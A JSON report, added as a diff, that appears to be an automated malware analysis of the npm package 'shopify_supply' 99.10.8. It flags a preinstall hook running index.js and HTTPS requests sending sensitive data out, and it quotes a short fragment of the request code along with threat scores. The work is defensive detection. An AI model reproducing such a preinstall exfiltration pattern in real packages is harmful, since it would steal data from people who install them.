@@ -1,0 +1,43 @@
+{
+  "package_metadata": {
+    "name": "shopify_supply",
+    "version": "99.10.8"
+  },
+  "behavior_analysis": {
+    "file_operations": [],
+    "network_activity": [
+      {
+        "location": "package/index.js:114",
+        "activity": "Exfiltrating sensitive data via HTTPS request"
+      },
+      {
+        "location": "package/index.js:124",
+        "activity": "Writing sensitive data to an outbound HTTPS request"
+      }
+    ],
+    "process_actions": [
+      {
+        "location": "package/package.json:8",
+        "action": "Preinstall script execution (node index.js)"
+      }
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "package/index.js",
+        "code_snippet": "var req = https.request(options, (res) => {\n    res.on(\"data\", (d) => {\n        //process.stdout.write(d);\n    });\n});\nreq.write(postData);"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.75,
+    "risk_score": 0.85,
+    "confidence": 0.95,
+    "indicators": [
+      "Confirmed data exfiltration attempts",
+      "Preinstall script with harmful commands",
+      "Network call anomalies"
+    ]
+  }
+}
